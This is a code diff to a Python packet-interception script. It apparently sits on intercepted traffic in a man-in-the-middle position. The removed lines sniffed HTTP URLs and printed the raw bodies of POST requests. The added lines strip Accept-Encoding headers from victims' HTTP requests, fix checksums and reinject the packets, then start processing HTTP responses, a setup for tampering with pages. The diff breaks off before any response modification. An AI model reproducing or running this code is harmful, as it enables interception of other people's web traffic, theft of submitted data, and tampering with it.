@@ -24,19 +24,33 @@ def sniff_packets(iface=None):
 def process_packet(packet):
    
     spacket = IP(packet.get_payload())
-    if packet.haslayer(HTTPRequest):
+    if spacket[TCP].dport == 80:
+        print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
 
-       url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        try:
+            load = spacket[Raw].load.decode()
+        except Exception as e:
+            packet.accept()
+            return
+        
+        new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
 
-       ip = packet[IP].src
+        spacket[Raw].load = new_load
 
-       method = packet[HTTPRequest].Method.decode()
+        spacket[IP].len = None
+        spacket[IP].chksum = None
+        spacket[TCP].chksum = None
 
-       print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        packet.set_payload(bytes(spacket))
 
-       if show_raw and packet.haslayer(Raw) and method == "POST":
-        print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+    if spacket[TCP].sport == 80:
+        print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
 
+        try:
+            load = spacket[Raw].load.decode()
+        except:
+            packet.accept()
+            return
 
 
 if __name__ == "__main__":
